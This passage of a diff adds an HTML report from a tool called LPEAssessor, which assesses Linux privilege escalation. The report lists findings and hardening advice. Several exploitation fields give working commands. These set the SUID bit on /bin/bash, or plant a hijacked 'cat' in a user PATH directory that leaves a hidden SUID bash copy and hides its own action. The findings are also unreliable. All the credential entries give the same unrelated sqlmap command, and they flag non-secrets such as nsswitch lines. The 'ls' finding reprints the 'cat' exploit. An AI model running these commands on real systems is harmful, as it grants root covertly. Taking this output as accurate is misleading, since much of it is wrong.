+            </div>
+            
+            <div class="finding finding-low">
+                <div class="finding-header">
+                    VULN-053: Plaintext Credentials
+                    <span>Low Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/etc/dbus-1/system.d/org.opensuse.CupsPkHelper.Mechanism.conf</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Pattern:</div>
+                    <div class="detail-value">(?i)user\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Matches:</div>
+                    <div class="detail-value"><ul>
+<li>cups-pk-helper</li>
+</ul></div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Creds Data:</div>
+                    <div class="detail-value"><ul>
+<li>{'pattern': '(?i)user\\s*[=:]\\s*[\\\'"]?([^\\\'"]+)[\\\'"]?', 'matches': ['cups-pk-helper']}</li>
+</ul></div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploitation:</div>
+                    <div class="detail-value">
+                        <p>Extract plaintext credentials from /etc/sqlmap/sqlmap.conf</p>
+                        <div class="code-block">cat /etc/sqlmap/sqlmap.conf</div>
+                    </div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-low">
+                <div class="finding-header">
+                    VULN-054: Plaintext Credentials
+                    <span>Low Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/etc/redsocks.conf</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Pattern:</div>
+                    <div class="detail-value">(?i)user\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Matches:</div>
+                    <div class="detail-value"><ul>
+<li>redsocks;
+	group = redsocks;
+	// chroot = </li>
+</ul></div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Creds Data:</div>
+                    <div class="detail-value"><ul>
+<li>{'pattern': '(?i)user\\s*[=:]\\s*[\\\'"]?([^\\\'"]+)[\\\'"]?', 'matches': ['redsocks;\n\tgroup = redsocks;\n\t// chroot = ']}</li>
+</ul></div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploitation:</div>
+                    <div class="detail-value">
+                        <p>Extract plaintext credentials from /etc/sqlmap/sqlmap.conf</p>
+                        <div class="code-block">cat /etc/sqlmap/sqlmap.conf</div>
+                    </div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-low">
+                <div class="finding-header">
+                    VULN-055: Plaintext Credentials
+                    <span>Low Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/etc/unicornscan/modules.conf</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Pattern:</div>
+                    <div class="detail-value">(?i)password\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Matches:</div>
+                    <div class="detail-value"><ul>
+<li>scanit! host=localhost dbname=scan</li>
+<li>scanit!</li>
+</ul></div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Creds Data:</div>
+                    <div class="detail-value"><ul>
+<li>{'pattern': '(?i)password\\s*[=:]\\s*[\\\'"]?([^\\\'"]+)[\\\'"]?', 'matches': ['scanit! host=localhost dbname=scan', 'scanit!']}</li>
+<li>{'pattern': '(?i)username\\s*[=:]\\s*[\\\'"]?([^\\\'"]+)[\\\'"]?', 'matches': ['scan']}</li>
+</ul></div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploitation:</div>
+                    <div class="detail-value">
+                        <p>Extract plaintext credentials from /etc/sqlmap/sqlmap.conf</p>
+                        <div class="code-block">cat /etc/sqlmap/sqlmap.conf</div>
+                    </div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-low">
+                <div class="finding-header">
+                    VULN-056: Plaintext Credentials
+                    <span>Low Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/etc/idmapd.conf</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Pattern:</div>
+                    <div class="detail-value">(?i)user\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Matches:</div>
+                    <div class="detail-value"><ul>
+<li>nobody
+Nobody-Group = nogroup
+</li>
+</ul></div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Creds Data:</div>
+                    <div class="detail-value"><ul>
+<li>{'pattern': '(?i)user\\s*[=:]\\s*[\\\'"]?([^\\\'"]+)[\\\'"]?', 'matches': ['nobody\nNobody-Group = nogroup\n']}</li>
+</ul></div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploitation:</div>
+                    <div class="detail-value">
+                        <p>Extract plaintext credentials from /etc/sqlmap/sqlmap.conf</p>
+                        <div class="code-block">cat /etc/sqlmap/sqlmap.conf</div>
+                    </div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-low">
+                <div class="finding-header">
+                    VULN-057: Plaintext Credentials
+                    <span>Low Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/etc/nsswitch.conf</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Pattern:</div>
+                    <div class="detail-value">(?i)passwd\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Matches:</div>
+                    <div class="detail-value"><ul>
+<li>files systemd winbind
+group:          files systemd winbind
+shadow:         files systemd
+gshadow:        files systemd
+
+hosts:          files mdns4_minimal [NOTFOUND=return] dns
+networks:       files
+
+protocols:      db files
+services:       db files
+ethers:         db files
+rpc:            db files
+
+netgroup:       nis
+</li>
+</ul></div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Creds Data:</div>
+                    <div class="detail-value"><ul>
+<li>{'pattern': '(?i)passwd\\s*[=:]\\s*[\\\'"]?([^\\\'"]+)[\\\'"]?', 'matches': ['files systemd winbind\ngroup:          files systemd winbind\nshadow:         files systemd\ngshadow:        files systemd\n\nhosts:          files mdns4_minimal [NOTFOUND=return] dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n']}</li>
+</ul></div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploitation:</div>
+                    <div class="detail-value">
+                        <p>Extract plaintext credentials from /etc/sqlmap/sqlmap.conf</p>
+                        <div class="code-block">cat /etc/sqlmap/sqlmap.conf</div>
+                    </div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-low">
+                <div class="finding-header">
+                    VULN-058: Plaintext Credentials
+                    <span>Low Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/etc/apparmor/parser.conf</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Pattern:</div>
+                    <div class="detail-value">(?i)user\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Matches:</div>
+                    <div class="detail-value"><ul>
+<li>:other</li>
+</ul></div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Creds Data:</div>
+                    <div class="detail-value"><ul>
+<li>{'pattern': '(?i)user\\s*[=:]\\s*[\\\'"]?([^\\\'"]+)[\\\'"]?', 'matches': [':other']}</li>
+</ul></div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploitation:</div>
+                    <div class="detail-value">
+                        <p>Extract plaintext credentials from /etc/sqlmap/sqlmap.conf</p>
+                        <div class="code-block">cat /etc/sqlmap/sqlmap.conf</div>
+                    </div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-low">
+                <div class="finding-header">
+                    VULN-059: Plaintext Credentials
+                    <span>Low Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/var/lib/ucf/cache/:etc:idmapd.conf</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Pattern:</div>
+                    <div class="detail-value">(?i)user\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Matches:</div>
+                    <div class="detail-value"><ul>
+<li>nobody
+Nobody-Group = nogroup
+</li>
+</ul></div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Creds Data:</div>
+                    <div class="detail-value"><ul>
+<li>{'pattern': '(?i)user\\s*[=:]\\s*[\\\'"]?([^\\\'"]+)[\\\'"]?', 'matches': ['nobody\nNobody-Group = nogroup\n']}</li>
+</ul></div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploitation:</div>
+                    <div class="detail-value">
+                        <p>Extract plaintext credentials from /etc/sqlmap/sqlmap.conf</p>
+                        <div class="code-block">cat /etc/sqlmap/sqlmap.conf</div>
+                    </div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-low">
+                <div class="finding-header">
+                    VULN-060: Writable Path Directory
+                    <span>Low Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/home/kali/.local/bin</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">kali</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">kali</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">0755</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploitation:</div>
+                    <div class="detail-value">
+                        <p>Create a malicious ls binary in /home/kali/.local/bin (which is in PATH) to escalate privileges</p>
+                        <div class="code-block">echo '#!/bin/bash\nchmod +s /bin/bash' > /home/kali/.local/bin/ls && chmod +x /home/kali/.local/bin/ls</div>
+                    </div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-medium">
+                <div class="finding-header">
+                    VULN-061: Path Hijacking
+                    <span>Medium Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Command:</div>
+                    <div class="detail-value">cat</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Writable Directory:</div>
+                    <div class="detail-value">/home/kali/.local/bin</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploitation:</div>
+                    <div class="detail-value">
+                        <p>Create a malicious cat binary in /home/kali/.local/bin that will create a SUID bash copy</p>
+                        <div class="code-block">echo '#!/bin/bash
+    # Path hijacking exploit for cat
+    # Created by Advanced Linux Privilege Escalation Tool
+
+    # Create a copy of bash with SUID permissions
+    cp /bin/bash /tmp/.privbash-1741967625
+    chmod 4755 /tmp/.privbash-1741967625
+
+    # Leave evidence of successful execution
+    echo "[+] Privilege escalation successful via cat path hijacking at $(date)" > /tmp/.privesc-success-1741967625
+
+    # Run the original command to avoid detection
+    cat "$@"
+    ' > /home/kali/.local/bin/cat && chmod +x /home/kali/.local/bin/cat</div>
+                    </div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-medium">
+                <div class="finding-header">
+                    VULN-062: Path Hijacking
+                    <span>Medium Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Command:</div>
+                    <div class="detail-value">ls</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Writable Directory:</div>
+                    <div class="detail-value">/home/kali/.local/bin</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploitation:</div>
+                    <div class="detail-value">
+                        <p>Create a malicious cat binary in /home/kali/.local/bin that will create a SUID bash copy</p>
+                        <div class="code-block">echo '#!/bin/bash
+    # Path hijacking exploit for cat
+    # Created by Advanced Linux Privilege Escalation Tool
+
+    # Create a copy of bash with SUID permissions
+    cp /bin/bash /tmp/.privbash-1741967625
+    chmod 4755 /tmp/.privbash-1741967625
+
+    # Leave evidence of successful execution
+    echo "[+] Privilege escalation successful via cat path hijacking at $(date)" > /tmp/.privesc-success-1741967625
+
+    # Run the original command to avoid detection
+    cat "$@"
+    ' > /home/kali/.local/bin/cat && chmod +x /home/kali/.local/bin/cat</div>
+                    </div>
+                </div>
+                
+                </div>
+            </div>
+            
+            </div>
+        </div>
+        
+        <div class="section">
+            <div class="section-header">Remediation Recommendations</div>
+            <div class="section-content">
+                <p>Based on the findings of this assessment, the following remediation actions are recommended:</p>
+                
+                <div class="finding">
+                    <div class="finding-header">General Hardening Recommendations</div>
+                    <div class="finding-content">
+                        <ul>
+                            <li>Apply the principle of least privilege for all user accounts and services</li>
+                            <li>Regularly update the system with security patches</li>
+                            <li>Implement robust file permission controls</li>
+                            <li>Configure proper sudo policies</li>
+                            <li>Disable unnecessary SUID/SGID binaries</li>
+                            <li>Monitor and audit system for unauthorized changes</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                
+            <div class="finding finding-high">
+                <div class="finding-header">High Risk Vulnerabilities</div>
+                <div class="finding-content">
+                    <ul>
+            <li>Remove unnecessary SUID bit from /etc/alternatives/rsh</li>
+<li>Remove unnecessary SUID bit from /etc/alternatives/rlogin</li>
+<li>Remove unnecessary SUID bit from /usr/lib/chromium/chrome-sandbox</li>
+<li>Remove unnecessary SUID bit from /usr/lib/openssh/ssh-keysign</li>
+<li>Remove unnecessary SUID bit from /usr/lib/polkit-1/polkit-agent-helper-1</li>
+<li>Remove unnecessary SUID bit from /usr/lib/policykit-1/polkit-agent-helper-1</li>
+<li>Remove unnecessary SUID bit from /usr/lib/xorg/Xorg.wrap</li>
+<li>Remove unnecessary SUID bit from /usr/libexec/polkit-agent-helper-1</li>
+<li>Remove unnecessary SUID bit from /usr/bin/rsh-redone-rlogin</li>
+<li>Remove unnecessary SUID bit from /usr/bin/ntfs-3g</li>
+<li>Remove unnecessary SUID bit from /usr/bin/rsh</li>
+<li>Remove unnecessary SUID bit from /usr/bin/pkexec</li>
+<li>Remove unnecessary SUID bit from /usr/bin/sudoedit</li>
+<li>Remove unnecessary SUID bit from /usr/bin/mount</li>
+<li>Remove unnecessary SUID bit from /usr/bin/fusermount3</li>
+<li>Remove unnecessary SUID bit from /usr/bin/gpasswd</li>
+<li>Remove unnecessary SUID bit from /usr/bin/rlogin</li>
+<li>Remove unnecessary SUID bit from /usr/bin/chfn</li>
+<li>Remove unnecessary SUID bit from /usr/bin/fusermount</li>
+<li>Remove unnecessary SUID bit from /usr/bin/sg</li>
+<li>Remove unnecessary SUID bit from /usr/bin/su</li>
+<li>Remove unnecessary SUID bit from /usr/bin/sudo</li>
+<li>Remove unnecessary SUID bit from /usr/bin/rsh-redone-rsh</li>
+<li>Remove unnecessary SUID bit from /usr/bin/newgrp</li>
+<li>Remove unnecessary SUID bit from /usr/sbin/umount.nfs4</li>
+<li>Remove unnecessary SUID bit from /usr/sbin/mount.nfs</li>
+<li>Remove unnecessary SUID bit from /usr/bin/chsh</li>
+<li>Remove unnecessary SUID bit from /usr/sbin/mount.nfs4</li>
+<li>Remove unnecessary SUID bit from /usr/bin/umount</li>
+<li>Remove unnecessary SUID bit from /usr/sbin/mount.smb3</li>
+<li>Remove unnecessary SUID bit from /usr/sbin/umount.nfs</li>
+<li>Remove unnecessary SUID bit from /usr/bin/passwd</li>
+<li>Remove unnecessary SUID bit from /usr/sbin/mount.ntfs-3g</li>
+<li>Remove unnecessary SUID bit from /usr/sbin/mount.ntfs</li>
+<li>Remove unnecessary SUID bit from /usr/sbin/pppd</li>
+<li>Remove unnecessary SUID bit from /usr/sbin/mount.cifs</li>
+
+                    </ul>
+                </div>
+            </div>
+            
+            <div class="finding finding-medium">
+                <div class="finding-header">Medium Risk Vulnerabilities</div>
+                <div class="finding-content">
+                    <ul>
+            <li>Remove unnecessary SGID bit from /etc/alternatives/locate</li>
+<li>Remove unnecessary SGID bit from /usr/lib/x86_64-linux-gnu/utempter/utempter</li>
+<li>Remove unnecessary SGID bit from /usr/lib/xorg/Xorg.wrap</li>
+<li>Remove unnecessary SGID bit from /usr/bin/dotlockfile</li>
+<li>Remove unnecessary SGID bit from /usr/bin/plocate</li>
+<li>Remove unnecessary SGID bit from /usr/bin/ssh-agent</li>
+<li>Remove unnecessary SGID bit from /usr/bin/chage</li>
+<li>Remove unnecessary SGID bit from /usr/sbin/unix_chkpwd</li>
+<li>Remove unnecessary SGID bit from /usr/bin/expiry</li>
+<li>Remove unnecessary SGID bit from /usr/bin/locate</li>
+<li>Remove unnecessary SGID bit from /usr/bin/crontab</li>
+<li>Review and secure PATH directories to prevent binary hijacking</li>
+<li>Review and secure PATH directories to prevent binary hijacking</li>
+
+                    </ul>
+                </div>
+            </div>
+            
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>This report was generated by LPEAssessor - Advanced Linux Privilege Escalation Assessment Tool</p>
+            <p>This report is confidential and intended for authorized security personnel only.</p>
+            <p>Assessment conducted in accordance with industry security standards and best practices.</p>
+        </div>
+    </div>
+</body>
+</html>
+        
